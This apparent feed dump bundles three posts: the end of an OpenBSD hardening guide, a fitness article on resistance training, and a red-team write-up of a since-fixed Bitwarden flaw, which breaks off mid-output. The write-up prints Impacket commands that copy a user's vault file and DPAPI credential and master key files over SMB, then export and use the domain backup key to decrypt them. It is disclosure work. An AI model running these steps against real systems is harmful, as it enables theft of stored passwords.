<p>This could also save you from mistaken commands that would pull stuff from the network like pip, npm and co.  I think it's always great to have a tight control on which program should do networking and which shouldn't.  On Linux this is actually easy to do, but on OpenBSD we can't restrict a single program so a proxy is the only solution.
</p>
<p>This can be done by creating a new user named <code>_proxy</code> (or whatever the name you prefer) using <code>useradd -s /sbin/nologin -m _proxy</code> and adding your SSH key to its authorized_keys file.
</p>
<p>Add this rule at the end of your file <code>/etc/pf.conf</code> and then reload with <code>pfctl -f /etc/pf.conf</code>:
</p>
<pre><code>block return out proto {tcp udp} user solene
</code></pre>
<p>Now, if you want to allow a program to use the network, you need to:
</p>
<ul>

  <li>toggle the proxy ON with the command: <code>ssh -N -D 10000 _proxy@localhost</code> which is only possible if your SSH private key is unlocked</li>
  <li>configure a SOCKS5 proxy in the program</li>
</ul>

<h3 id="_Some_network_fixes">4.0.1. Some network fixes <a href="#_Some_network_fixes">¬ß</a></h3>
<p>Most programs will react to a proxy configured in a variable named <code>http_proxy</code> or <code>https_proxy</code> or <code>all_proxy</code>, however it's not a good idea to globally define these variables for your user as it would be a lot easier to a program to use the proxy automatically, which is against the essence of this proxy.
</p>
<h4 id="_SSH">4.0.1.1. SSH <a href="#_SSH">¬ß</a></h4>
<p>By default, you won't be able to ssh to anything except on a local user, we need to proxy every remote ssh connection through the local _proxy user.
</p>
<p>In <code>~/.ssh/config</code>:
</p>
<pre><code>Host localhost
User _proxy
ControlMaster auto
ControlPath ~/.ssh/%h%p%r.sock
ControlPersist 60

Host *.*
ProxyJump localhost
</code></pre>
<h4 id="_Chromium">4.0.1.2. Chromium <a href="#_Chromium">¬ß</a></h4>
<p>If you didn't configure GNOME proxy settings, Chromium / Ungoogled Chromium won't use a proxy, except if you add a command line parameter <code>--proxy-server=socks5://localhost:10000</code>.
</p>
<p>I tried to manually modified the dconf database where the "GNOME" settings are to configure the proxy, but I didn't get it to work (it used to work for me, but I can't succeed anymore).
</p>
<h4 id="_Syncthing">4.0.1.3. Syncthing <a href="#_Syncthing">¬ß</a></h4>
<p>If you use syncthing, you need to proxy all its traffic through the SSH tunnel. This is done by setting the environment variable <code>all_proxy=socks5://localhost:10000</code> in the program environment.
</p>
<h2 id="_Live_in_a_temporary_file-system">5. Live in a temporary file-system <a href="#_Live_in_a_temporary_file-system">¬ß</a></h2>
<p>It's possible to have most of your home directory be a temporary file system living in memory, with a few directories with persistency.
</p>
<p>This change would prevent anyone from using temporary files or cache left-over from previous session.
</p>
<p>The most efficient method to achieve this is to use the program home-impermanence that I wrote for this use case, it handles a list of files/directories that should be persistent.
</p>
<p><a href="https://dataswamp.org/~solene/2022-03-15-openbsd-impermanence.html">Blog post: Reproducible clean $HOME on OpenBSD using impermanence</a></p>
<p>If you only want to start fresh using a template (that doesn't evolve on use), you can check the flag <code>-P</code> of <code>mount_mfs</code> which allows populating the fresh memory based file system using an existing directory.
</p>
<p><a href="https://man.openbsd.org/mount_mfs">OpenBSD man page: mount_mfs(8)</a></p>
<h2 id="_Disable_webcam_and_microphone">6. Disable webcam and microphone <a href="#_Disable_webcam_and_microphone">¬ß</a></h2>
<p>Good news!  I take the opportunity here to remember OpenBSD disables by default the video and audio recording of the various capable devices, instead, they will appear to work but record empty stream of data.
</p>
<p>They can be manually enabled by changing the sysctls <code>kern.audio.record</code> or <code>kern.video.record</code> to 1 when you need to use them.
</p>
<h2 id="_Disabling_USB_ports">7. Disabling USB ports <a href="#_Disabling_USB_ports">¬ß</a></h2>
<p>If you need to protect your system from malicious USB devices (usually in an office environment), you should disable them in the BIOS/Firmware if possible.
</p>
<p>If it's not possible, then you could still disable the kernel drivers at boot time using this method.
</p>
<p>Create the file <code>/etc/bsd.re-config</code> and add the content to it:
</p>
<pre><code>disable usb
disable xhci
</code></pre>
<p>This will disable the support for USB 3 and 2 controllers.  On a desktop computer, you may want to use PS/2 peripherals in these conditions.
</p>
<h2 id="_System-wide_services">8. System-wide services <a href="#_System-wide_services">¬ß</a></h2>
<h2 id="_Clamav_antivirus">8.1. Clamav antivirus <a href="#_Clamav_antivirus">¬ß</a></h2>
<p>While this one may make you smile, if there is a chance it saves you once, I think it's still a valuable addition to any kind of hardening.  A downloaded attachment from an email, or rogue JPG file could still harm your system.
</p>
<p>OpenBSD ships a fully working clamav service, don't forget to enable freshclam, the viral database updater.
</p>
<h2 id="_Auto-update">8.2. Auto-update <a href="#_Auto-update">¬ß</a></h2>
<p>I already covered it in a previous article about anacron, but in my opinion, auto-updating the packages and base system daily on a computer is the minimum that should be done everywhere.
</p>
<p><a href="https://dataswamp.org/~solene/2023-06-28-anacron.html#_Useful_examples">Anacron: useful OpenBSD examples</a></p>
<h2 id="_System_configuration">9. System configuration <a href="#_System_configuration">¬ß</a></h2>
<h2 id="_Memory_allocation_hardening">9.1. Memory allocation hardening <a href="#_Memory_allocation_hardening">¬ß</a></h2>
<p>The OpenBSD malloc system allows you to enable some extra checks, like use after free, heap overflow or guard pages, they can be all enabled at once.  This is really efficient for security as most security exploits relies on memory management issues, BUT it may break software that have memory management issues (there are many of them).  Using this mode will also impact the performance negatively, as the system needs to do more checks for each piece of allocated memory.
</p>
<p>In order to enable it, add this to <code>/etc/sysctl.conf</code>:
</p>
<pre><code>vm.malloc_conf=S
</code></pre>
<p>It can be immediately enabled with <code>sysctl vm.malloc_conf=S</code>, and disabled by setting no value <code>sysctl vm.malloc_conf=""</code>.
</p>
<p>The program <code>ssh</code> and <code>sshd</code> always run with this flag enabled, even if it's disabled system-wide.
</p>
<h2 id="_Some_ideas_to_go_further">10. Some ideas to go further <a href="#_Some_ideas_to_go_further">¬ß</a></h2>
<h2 id="_Specialized_proxies">10.1. Specialized proxies <a href="#_Specialized_proxies">¬ß</a></h2>
<p>It could be possible to have different proxy users, with each restriction to the remote ports allowed, we could imagine proxies like:
</p>
<ul>

  <li>http / https / ftp</li>
  <li>ssh only</li>
  <li>imap / smtp</li>
  <li>etc....</li>
</ul>

<p>Of course, this is even more tedious than the multipurpose proxy, but at least, it's harder for a program to guess what proxy to use, especially if you don't connect them all at once.
</p>
<h2 id="_Run_process_using_dedicated_users">10.2. Run process using dedicated users <a href="#_Run_process_using_dedicated_users">¬ß</a></h2>
<p>I wrote a bit about this in the past, for command line programs, running them in dedicated local users over SSH make sense, as long as it's still practical.
</p>
<p><a href="https://dataswamp.org/~solene/2019-11-12-dedicated-users-processes.html">Dedicated users to run processes</a></p>
<p>But if you need to run graphical programs, this becomes tricky. Using <code>ssh -Y</code> gives the remote program a full access to your display server, which has access to everything else running, not great...  You could still rely on <code>ssh -X</code> which enables X11 Security extensions, but you have to trust the implementation, and it comes with issues like no shared clipboard, poor performance and programs crashing when attempting to access a legit resource that is blocked by the security protocol...
</p>
<p>In my opinion, the best way to achieve isolation for graphical programs would be to run a dedicated VNC server in the local user, and connect from your own user.  This should be better than running on your own X locally.
</p>
<h2 id="_Encrypted_home_with_USB_unlocking">10.3. Encrypted home with USB unlocking <a href="#_Encrypted_home_with_USB_unlocking">¬ß</a></h2>
<p>In a setup where the computer is used by multiple person, the system encryption may be tedious because everyone have to remember the main passphrase, you have no guarantee one won't write it down on a post-it... In that case, it may be better to have a personal volume, encrypted, for each user.
</p>
<p>I don't have an implementation yet, but I got a nice idea.  Adding a volume for a user would look like the following:
</p>
<ul>

  <li>take a dedicated USB memory stick for this user, this will be used as a "key" to unlock their data directory</li>
  <li>overwrite the memory stick with random data</li>
  <li>create an empty disk file on the system, it will contain the encrypted virtual disk, use a random part of the USB disk for the passphrase (you will have to write down the length + offset)</li>
  <li>write a rc file that looks for the USB disk volume if present, if so, tries to unlock and mount the partition upon boot</li>
</ul>

<p>This way, you only need to have your USB memory stick plugged in when the system is booting, and it should automatically unlock and mount your personal encrypted volume.  Note that if you want to switch user, you would have to reboot to unlock their drive if  you don't want to mess with the command line.
</p>
<h2 id="_Conclusion">11. Conclusion <a href="#_Conclusion">¬ß</a></h2>
<p>It's always possible to harden a system more and more, but the balance between real world security and actual usability should always be studied.
</p>
<p>No one will use a too-much hardened system if they can't work on it efficiently, on the other handle, users expect their system to protect them against most common threats.
</p>
<p>Depending on one's environment and threat model, it's important to configure their system accordingly.
</p>

</article>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Reasons to grow and keep big muscles (116 pts)]]></title>
            <link>https://todaypurpose.com/posts/big-muscles/</link>
            <guid>38853118</guid>
            <pubDate>Wed, 03 Jan 2024 12:03:23 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://todaypurpose.com/posts/big-muscles/">https://todaypurpose.com/posts/big-muscles/</a>, See on <a href="https://news.ycombinator.com/item?id=38853118">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><time datetime="2023-12-28T13:37:59+0800">Dec 28, 2023</time></p><p>Life isn‚Äôt just about how long we live; it‚Äôs about how well we live it. We often hear about increasing our lifespan, but is a longer life worth it if we can‚Äôt move and become dependent on others? What‚Äôs equally, or even more important, is enhancing our healthspan‚Äîthe period during which we enjoy a good quality of life. From what I‚Äôve observed when talking to older people, they care more about ‚Äúimproving the quality of their life‚Äù than ‚Äúliving a longer life‚Äù</p><p>Imagine being unable to engage in activities you love, like traveling, playing with kids, hiking, or even just gardening. The loss of functional ability can lead to a diminished the enjoyment we have in life.</p><p>What can you do to maintain your independence, relationships, and <strong>dignity</strong>? I believe the answer lies in working out, especially <strong>resistance training</strong> that helps keeping our strength. In his book <a href="https://peterattiamd.com/outlive/">‚ÄúOutlive‚Äù</a>, Peter Attia shows how we can increase our healthpan and combat the effect of aging :</p><p><img src="https://todaypurpose.com/img/working-out/increase-healthspan-quality-of-life.jpg" alt="Health Decline Graphic"></p><blockquote><p>‚ÄúExercise is by far the most potent longevity ‚Äòdrug‚Äô available.‚Äù It‚Äôs not just about delaying death; it‚Äôs about preserving cognitive and physical abilities.</p></blockquote><h2 id="the-inevitable-decline-begins-in-your-30s">The inevitable decline begins in your 30s</h2><p>Many of us don‚Äôt notice it in our 20s, but as we enter our 30s, the signs become more and more reccurent. Recovery from injuries slows down, we get tired more quickly, and our overall vigor starts to wane.</p><h3 id="sarcopenia-losing-muscle-and-strength-as-we-age">sarcopenia: losing muscle and strength as we age</h3><p>Sarcopenia is the loss of muscle strength with age. It often catches people off guard and people realize it when it‚Äôs too late. Starting as early as age 30, we begin to lose 3% to 5% of our muscle mass each decade. By the end of a typical lifespan, most individuals have lost about 30% of their muscle strength.
Preserving muscle mass is crucial. <strong>No amount of cardio</strong> (running, cycling) can combat this natural decline. Both men and women need to engage in strength training along with cardiovascular exercise.</p><p><img src="https://todaypurpose.com/img/working-out/muscle-strengtht-loss.webp" alt="Muscle Loss Over Time"></p><p>Look at the similarities in thigh muscle of the triathletes and someone who does not move below (<a href="https://twitter.com/ChamberofFit/status/1688607251316056065">source</a>):</p><p><img src="https://pbs.twimg.com/media/F28jWCFWwAAWJbn?format=jpg" alt="Comaparison triathlete sedetanire"></p><h2 id="resistance-training-the-ultimate-drug-to-improve-healthspan">Resistance Training: The ultimate drug to improve healthspan</h2><p>The graph show than our peak strength happen at 30 and start decreasing over time:</p><p><img src="https://todaypurpose.com/img/working-out/peak-strenght.jpeg" alt="Peak strength"></p><p>This other graph show the effect of resistance training, and how it can prevent disability:</p><p><img src="https://todaypurpose.com/img/working-out/resistance-training-effect.png" alt="Effect of Exercises Over Time"></p><p>Without resistance training, our bodies undergo a transformation post-30: muscle loss gives way to a higher fat percentage, leading to a weaker physique and the lose of autonomy.</p><h3 id="reducing-the-risk-of-injuries-and-falls">reducing the risk of injuries and falls</h3><p>Falls are a leading cause of mortality for people over 75. Resistance training enhances lower body strength, crucial for activities like climbing stairs or simply standing up from a chair. Stronger muscles also mean better balance and a reduced risk of falls, which can be catastrophic in later life. Starting 60-65: risk of falls that lead to immediate death or within 12 months (break hips / femur) is really high (15-30% depending the study). <a href="https://www.cdc.gov/falls/data/">Over 14 million, or 1 in 4 older adults report falling every year</a>. It is also the leading cause on the non-fatal injuries in the USA at all ages :</p><p><img src="https://todaypurpose.com/img/working-out/fall-leading-cause-hospitals.png" alt="Fall hospitals"></p><h3 id="a-20-year-advantage">a 20-year advantage</h3><p><a href="https://www.nsca.com/contentassets/2a4112fb355a4a48853bbafbe070fb8e/resistance_training_for_older_adults__position.1.pdf">Research</a> shows that 85-year-old individuals who have consistently engaged in weightlifting display similar physical power to non-lifting 65-year-olds. Long-term resistance training can grant an approximate 20-year advantage in physical capabilities.</p><h3 id="avoiding-pains">avoiding pains</h3><p>If you are in your 30s like me, you probably already feel it. Regular exercise, especially strength training, plays a vital role in pain prevention and management. Weak muscles and a sedentary lifestyle often lead to chronic pain issues, which can severely impact the quality of life in our later years.</p><h2 id="other-reasons-to-stay-strong-as-we-age">Other reasons to stay strong as we age?</h2><h3 id="cognitive-benefits-mood-stamina">cognitive benefits, mood, stamina</h3><p>Resistance training doesn‚Äôt just benefit the body; it also supports cognitive health. Low muscle mass and physical inactivity are linked to cognitive decline in old age. Exercise releases myokines, which support brain health, indicating a dose-dependent effect between muscle mass and cognitive function.</p><p>It also boost mood and reduce symptoms of anxiety and depression. When pushing hard, your body release endorphins and other mood-enhancing chemicals during exercise. These natural mood lifters contribute to a sense of well-being you can get each time you go for a workout.</p><p>Beyond building muscle strength, resistance training enhances overall stamina and endurance. This increased stamina is not just physical; it translates into greater mental and emotional resilience. Older adults with higher levels of fitness and stamina are better equipped to handle the challenges of daily life, remain independent, and engage in social activities, which are crucial for mental health and quality of life.</p><h3 id="being-in-control">being in control</h3><p>Resistance training is the art of pushing yourself than what you think is your limit. It teaches the value of persistence, discipline, and hard work. The satisfaction of achieving a physical goal through resistance training, and in my humble opinion, can <strong>boost confidence</strong> in one‚Äôs ability to <strong>overcome other challenges in life</strong> you might think are not possible to overcome.</p><p>Alan Thrall (that I started following because his excellent <a href="https://www.youtube.com/watch?v=UFs6E3Ti1jg">‚Äúhow to squat video‚Äù</a>) puts it really well. Why did he kept working out during a crazy time such has the first weeks of having a baby and he his overwhelmed?</p><blockquote><p>When times get tough, I need keeps everyone (his household) grounded, and helps people moving to the right direction. Stay 1 step ahead of everything, and not only being pushed around by life circumstances. I need to be stronger than the situation.</p></blockquote><iframe width="560" height="315" src="https://www.youtube.com/embed/NQlHBvg6Cgw?si=wsx7Pvh-gDhkrXCP&amp;start=516" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe><h3 id="independance-autonomy">independance, autonomy</h3><p>As we lost strength we will lose ability to grab things, or even walk. This might lead to Keeping some dignity as a human being.
The ability to engage in activities like playing with kids, hiking, or traveling is not just a matter of physical capability; it‚Äôs also about maintaining independence and relationships, which are central to happiness. As we age, the desire to remain self-reliant grows stronger, and resistance training plays a crucial role in this.</p><h3 id="keeping-relationships">keeping relationships</h3><p>Strength directly influences our ability to maintain social connections. If our mobility decreases, so does the ability to visit friends and family, which can lead to isolation and loneliness.</p><p>Staying strong and mobile enables us to actively participate in social activities, maintaining and nurturing relationships that are essential for mental and emotional well-being.</p><p>Staying healthy is probably the best gift we can give to our children. As we become more dependent due to health issues, we not only incur significant healthcare costs but also potentially place a financial and emotional burden on our families.</p><h3 id="reducing-risk-of-cancer-and-heart-disease">reducing risk of cancer and heart disease:</h3><p>Resistance training can lead from <strong>10 to 20 percent reduction</strong> in the risk of early death from all causes and from cancer and heart disease. <a href="https://bjsm.bmj.com/content/56/13/755">https://bjsm.bmj.com/content/56/13/755</a></p><h3 id="staying-fit-by-doing-nothing">staying fit by doing ‚Äúnothing‚Äù</h3><p>Friends usually ask me how I can stay fit by eating that much I believe I have and advantage I‚Äôve been building since I was 10ish: I kept working out. I‚Äôve built muscle over the years, and my <strong>resting metabolic rate</strong> . Lean muscle burns more calories than fat, even at rest. Having more muscle is a kind of cheat code. By increasing muscle mass your resting metabolic rate goes up. It means that <a href="https://todaypurpose.com/posts/big-muscles/(https://www.researchgate.net/figure/Relationship-between-BMR-and-lean-body-mass_fig1_5440088)">you can burn more calories when you are at rest</a>:</p><p><img src="https://todaypurpose.com/img/working-out/resting-metabolic-rate-vs-lean-muscle.png" alt="resting metabolic rate vs muscle"></p><p>Of course you‚Äôll need to preserve those muscle with resistance training.</p><h2 id="some-last-words">Some last words</h2><p>Resistance training is a choice you make. It‚Äôs hard, but only has upsides for your current and future self. It is never too late to start. The benefits of starting it can be seen at any age. The key is to keep doing it, no matter what.</p><p>My only advices:</p><ul><li>Find good lasting reasons to workout (I hope this article helped) and stop finding excuses to not go.</li><li>If you‚Äôre over 30 (or even in your 20s and able to afford it), hire a personal trainer to start. They can check your form and avoid any kind of injuries. With weights, it is really easy to get a bad form, no matter how many youtube videos you watch. I went to see a Physiotherapist 4 years after I started squats, and this is the best thing I‚Äôve ever done. She retaught me everything I think I knew about squatting.</li><li>I also do a bit of aerobic exercices (cardio). But excessive cardio is counterproductive, leading to loss of muscle mass and potential joint issues.</li><li>The CDC recommends <a href="https://www.cdc.gov/physicalactivity/basics/age-chart.html">2+ days per week that work all major muscle groups (legs, hips, back, abdomen, chest, shoulders, and arms)</a>.</li><li>For very beginner, I do recommend the <a href="https://stronglifts.com/5x5/">5x5 program</a>. The program work on all biggest muscles of your bodies. I do also like their app that is really easy to follow. There is plenty of strength training gurus out there. No matter what program you pick, you‚Äôll find benefits any of them.</li><li>When you go to the gym, leave your ego at home, and never compare yourself to others. You‚Äôll just get injured.</li></ul><hr><p>Liked this post ? You‚Äôll love that one: <a href="https://todaypurpose.com/posts/time-money-health/">On Time, Money and Health</a></p><hr></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Bitwarden Heist ‚Äì How to Break into Password Vaults Without Using Passwords (212 pts)]]></title>
            <link>https://blog.redteam-pentesting.de/2024/bitwarden-heist/</link>
            <guid>38853058</guid>
            <pubDate>Wed, 03 Jan 2024 11:53:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.redteam-pentesting.de/2024/bitwarden-heist/">https://blog.redteam-pentesting.de/2024/bitwarden-heist/</a>, See on <a href="https://news.ycombinator.com/item?id=38853058">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    <h4>3 January 2024</h4>
    
    



    <p>Sometimes, making particular security design decisions can have unexpected
consequences. For security-critical software, such as password managers, this
can easily lead to catastrophic failure: In this blog post, we show how
<a href="https://bitwarden.com/">Bitwarden‚Äôs</a> Windows Hello implementation allowed us
to remotely steal all credentials from the vault without knowing the password
or requiring biometric authentication. When we discovered this during a
penetration test it was so unexpected for us that we agreed with our client to
publish a blog post about it and tell the story.</p>
<p><strong>The underlying issue has been corrected in Bitwarden v2023.4.0 in April 2023</strong>
(but the story is interesting nonetheless).</p>


<a href="https://blog.redteam-pentesting.de/2024/bitwarden-heist/banner_close.webp">
            <p><img src="https://blog.redteam-pentesting.de/2024/bitwarden-heist/banner_close_hu36683dd95a8014e4eb61d87ec949c2f1_125614_1200x0_resize_q100_bgffffff_box_2.jpg" alt="Windows Logo on blue shield in front of an open vault">
            </p>

            <p><img src="https://blog.redteam-pentesting.de/2024/bitwarden-heist/banner_close.webp" alt="Windows Logo on blue shield in front of an open vault">
            </p>
        </a>
    

<h3 id="where-we-started">Where We Started</h3>
<p>We recently conducted a penetration test with the goal of compromising the
internal network of a client in a Windows environment. As usual, we managed to
get administrative access to the domain controller, however, there was an
additional hurdle: The backup server, one of the prioritized targets, did not
reside within the domain. Having already gained access to Domain Administrator
accounts, we decided to take a look around their Windows workstations in the
hopes of uncovering information that would grant us access to the backup
system. Looking at the workstations, we found that passwords seemed to be
stored using Bitwarden (the following details apply to Version <a href="https://github.com/bitwarden/clients/releases/tag/desktop-v2023.3.0">Desktop
v2023.3.0</a>
of the software). We made the assumption that credentials to the backup system
might be found in the Bitwarden vault of the employees in charge of the IT
infrastructure. After consulting with our client, we got the permission to
attempt to retrieve the contents of one of these vaults. Since we did not want
to potentially disrupt the client‚Äôs business by using invasive techniques such
as key loggers to obtain access to the backup system, we looked for an
unintrusive way without relying on end user interaction if possible.</p>
<p>We first tried to crack the vault using simple credential stuffing attacks,
however this remained unsuccessful, leading us to ultimately attempt a more
creative approach. To further analyze the vault, we decided to download
the main storage file of Bitwarden, in the hopes of finding anything of note. It
is located under the user‚Äôs home directory at
<code>%AppData%\Bitwarden\data.json</code>. Downloading the JSON file and opening it
in a text editor already revealed an unexpected finding:</p>
<div><pre tabindex="0"><code data-lang="json"><span><span>		<span>"openAtLogin"</span><span>:</span> <span>false</span><span>,</span>
</span></span><span><span>		<span>"enableBiometrics"</span><span>:</span> <span>true</span><span>,</span>
</span></span><span><span>		<span>"biometricText"</span><span>:</span> <span>"unlockWithWindowsHello"</span><span>,</span>
</span></span><span><span>		<span>"noAutoPromptBiometricsText"</span><span>:</span> <span>"autoPromptWindowsHello"</span><span>,</span>
</span></span><span><span>		<span>"installedVersion"</span><span>:</span> <span>"2023.3.0"</span><span>,</span>
</span></span><span><span>        [<span>...</span>]
</span></span><span><span>			<span>"avatarColor"</span><span>:</span> <span>null</span><span>,</span>
</span></span><span><span>			<span>"biometricUnlock"</span><span>:</span> <span>true</span>
</span></span><span><span>		<span>},</span>
</span></span><span><span>		<span>"tokens"</span><span>:</span> {
</span></span></code></pre></div><p>It seemed that this Bitwarden vault could be opened using Biometrics, and
Windows Hello in particular. We had the feeling that it might be worth looking
at, so we decided to dig deeper.</p>
<h3 id="biometric-unlock---how-does-it-work">Biometric Unlock - How Does it Work?</h3>
<p>Even if biometrics are enabled, the vault still has a main password (Bitwarden
calls it <a href="https://bitwarden.com/help/master-password/">master password</a>), you
simply do not have to always enter it to unlock the vault. This begs the
question how the vault is secured if you do not have to enter the master
password. Well, the vault is not really encrypted with the master password, but
with an <em>account encryption key</em>, which is itself stored in encrypted form
within the vault. The key to decrypting the <em>account encryption key</em> is derived
from the <em>main password</em> chosen during vault creation.</p>
<p><em>In other words:</em> When a user enters their main password, Bitwarden derives a key
from the password and this key is then used to decrypt the actual <em>account
encryption key</em> which in turn can decrypt the credentials stored in the vault.</p>
<p>The key derived from the <em>main password</em> will be called <em>derived key</em> from now
on and it is exactly where the biometric unlock comes into play. At this point,
users can choose to add additional unlock mechanisms, which usually results in an
encrypted copy of the <em>derived key</em> being stored at a (hopefully) safe location
from which it can be retrieved using biometrics, for example. As a result,
whoever can retrieve and decrypt the <em>derived key</em> does not need a password to
access the vault.</p>
<p>The already described Biometric unlock is implemented based on Windows Hello on
Windows machines. Consequently, activating biometric login on Windows means that
the <em>derived key</em> is encrypted locally using a secret which can be retrieved
after authentication via Windows Hello. So far so good, but as it turns out, it
is very much worthwhile to take a closer look into how this is actually
implemented in Bitwarden.</p>
<p>After some digging, we found that Bitwarden stored the encrypted copy of the
<em>derived key</em> using the Windows Credentials API by calling
<a href="https://learn.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credwritew"><code>windows::win32::Credentials::CredWriteW</code></a>
in the <a href="https://github.com/bitwarden/clients/blob/7f25f5f6ecc47ae3354b60e6ba6158f8be185a8d/apps/desktop/desktop_native/src/password/windows.rs#L110">bitwarden/clients Rust
code</a>.
Unfortunately, the documentation on how these credentials are protected is
meager, to say the least, which makes it complicated to actually understand what
is happening when the API is used. It seems, as though <code>CredWriteW</code> creates
credentials using the <a href="https://stackoverflow.com/a/9228105">Credential Manager</a>,
which in turn seems to invoke the lower-level Data Protection API
(<a href="https://learn.microsoft.com/en-us/windows/win32/seccng/cng-dpapi">DPAPI</a>).
DPAPI provides a convenient way to <a href="https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata">store data
securely</a>
such that only the given user is able to retrieve the data at a later point in
time. The differences between protecting credentials via the Credential Manager
and DPAPI are somewhat unclear, however using the Credential Manager seems to
provide <a href="https://stackoverflow.com/a/9228105">additional benefits</a> over using
the low-level API, for example UI visibility (you can test this yourself by
searching for the <code>Credential Manager</code> application in you Windows Start menu).</p>
<p>So in order to decrypt the Bitwarden vault, we either need to know the main
password in order to derive the <em>derived key</em> on-the-fly or we need to retrieve
the <em>derived key</em> from the depths of the encrypted DPAPI storage. We knew that
DPAPI has a lot of ties to the Active Directory that are relevant for
domain-joined workstations and we had already compromised the client‚Äôs Active
Directory, so we chose the latter approach.</p>
<h3 id="robbing-the-vault-remotely---who-needs-a-master-password-anyway">Robbing the Vault Remotely - Who Needs a Master Password, Anyway?</h3>
<p>We soon learned about an <a href="https://learn.microsoft.com/en-us/windows/win32/seccng/cng-dpapi-backup-keys-on-ad-domain-controllers">awfully convenient
feature</a>
of DPAPI, or rather its newer version
<a href="https://learn.microsoft.com/en-us/windows/win32/seccng/cng-dpapi">DPAPI-NG</a> on
domain-joined workstations:</p>
<blockquote>
<p>Normally, domain users encrypt DPAPI-protected data using keys that are
derived from their own passwords. However, if the user forgets their password,
or if their password is administratively reset or reset from another device,
the previously encrypted data can no longer be decrypted using the new keys
derived from the user‚Äôs new password. When this occurs, the data can still be
decrypted using the Backup keys stored on the Active Directory domain
controllers. They can then be re-encrypted with the user‚Äôs new
password-derived key. This means that anyone who has the DPAPI Backup keys for
a domain will be able to decrypt DPAPI-encrypted data for any domain user,
even after the user‚Äôs password is changed.</p>
</blockquote>
<p>This means for one that the data is encrypted using the password of the domain
user and no direct involvement of Windows Hello is needed to decrypt it (as long
as the user‚Äôs password is known). Furthermore, the data can additionally be
decrypted with a <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-bkrp/">remote backup
key</a>
stored on the domain controller. What could possibly go wrong?</p>
<p>Since the workstation running Bitwarden was domain-joined and the domain was
already compromised, we began hunting for DPAPI keys in order to exploit this
mechanism. First, we need to obtain whatever DPAPI stores on the machine itself.</p>
<p>We quickly found that two directories were of particular relevance to us:
<code>%AppData%\Microsoft\Protect</code>, which is used to securely store the <em>DPAPI
decryption keys</em>, and <code>%AppData%\Microsoft\Credentials</code>, where the <em>protected
data</em> resides. Note, that we use some simplifications involving the creation of
session keys in DPAPI since they are of no relevance to this blog post; details
are available <a href="https://learn.microsoft.com/en-us/previous-versions/ms995355(v%3Dmsdn.10)">here</a>.</p>
<p>If you open these directories in the Explorer, you won‚Äôt see anything because
they are hidden in a way that Explorer won‚Äôt even show them when ‚ÄúShow hidden
files‚Äù is enabled. However, the PowerShell command <code>Get-ChildItem</code> or <code>gci</code> can
display them when adding <code>--force</code> or <code>--hidden</code>. They are also visible via SMB
and as we already had remote administrator access we chose this path.</p>
<p>The following code snippets are taken from our lab environment, but are closely
based on the actual penetration test. First, we obtained the required Bitwarden
data file using <code>smbclient</code> from the <a href="https://github.com/fortra/impacket">Impacket
project</a>:</p>
<pre tabindex="0"><code>$ smbclient.py 'LAB/Administrator:&lt;password&gt;@workstation.lab'
Impacket v0.10.0.post1+20230417.105142.28de12f1 - Copyright 2022 Fortra

Type help for list of commands
# use C$
# get \Users\user1\AppData\Roaming\Bitwarden\data.json
</code></pre><p>In the same session, we also downloaded the <code>Credentials</code> and <code>Protected</code> data:</p>
<pre tabindex="0"><code># cd \Users\user1\AppData\Roaming\Microsoft\Credentials\
# ls
drw-rw-rw-          0  Tue Nov 28 12:59:46 2023 .
drw-rw-rw-          0  Tue Nov 28 12:59:46 2023 ..
-rw-rw-rw-        686  Tue Nov 28 14:02:38 2023 C6530B1481D73604A6A51D114372F1AA
# get C6530B1481D73604A6A51D114372F1AA
# cd ..
# cd Protect
# ls
drw-rw-rw-          0  Mon Nov 27 09:59:01 2023 .
drw-rw-rw-          0  Mon Nov 27 09:59:01 2023 ..
-rw-rw-rw-         24  Mon Nov 27 09:58:51 2023 CREDHIST
drw-rw-rw-          0  Mon Nov 27 09:58:51 2023 S-1-5-21-505269936-2602674991-4082112561-1105
-rw-rw-rw-         76  Mon Nov 27 09:59:01 2023 SYNCHIST
# cd S-1-5-21-505269936-2602674991-4082112561-1105
# ls
drw-rw-rw-          0  Mon Nov 27 09:58:51 2023 .
drw-rw-rw-          0  Mon Nov 27 09:58:51 2023 ..
-rw-rw-rw-        740  Mon Nov 27 09:58:51 2023 14c8d0db-8c7c-4bf8-a857-eb20500a3893
-rw-rw-rw-        904  Mon Nov 27 09:58:51 2023 BK-LAB
-rw-rw-rw-         24  Mon Nov 27 09:58:51 2023 Preferred
# get 14c8d0db-8c7c-4bf8-a857-eb20500a3893
# exit
</code></pre><p>Downloading these files made it possible to work on the decryption process
locally, however it also meant that we did not gain access to the user‚Äôs main
decryption password directly. This is where the handy feature to decrypt DPAPI
decryption keys using backup keys comes into play, as we know that it is
possible to decrypt these local secrets with the backup key from the domain
controller. We could conveniently download it using the <code>dpapi.py</code> script from
the <a href="https://github.com/fortra/impacket">Impacket project</a>:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>$ dpapi.py backupkeys -t <span>'LAB/Administrator:&lt;password&gt;@dc.lab'</span> --export
</span></span></code></pre></div><p>In this case, we renamed the key to <code>backupkey.pvk</code>. Using this newly acquired
key, we could start by decrypting the protected DPAPI decryption key that we
took from the workstation:</p>
<!-- raw HTML omitted -->
<div><pre tabindex="0"><code data-lang="shell"><span><span>$ dpapi.py masterkey -pvk backupkey.pvk -file ./14c8d0db-8c7c-4bf8-a857-eb20500a3893
</span></span><span><span>Impacket v0.10.0.post1+20230417.105142.28de12f1 - Copyright <span>2022</span> Fortra
</span></span><span><span>
</span></span><span><span><span>[</span>MASTERKEYFILE<span>]</span>
</span></span><span><span>Version     :        <span>2</span> <span>(</span>2<span>)</span>
</span></span><span><span>Guid        : 14c8d0db-8c7c-4bf8-a857-eb20500a3893
</span></span><span><span>Flags       :        <span>0</span> <span>(</span>0<span>)</span>
</span></span><span><span>Policy      :        <span>0</span> <span>(</span>0<span>)</span>
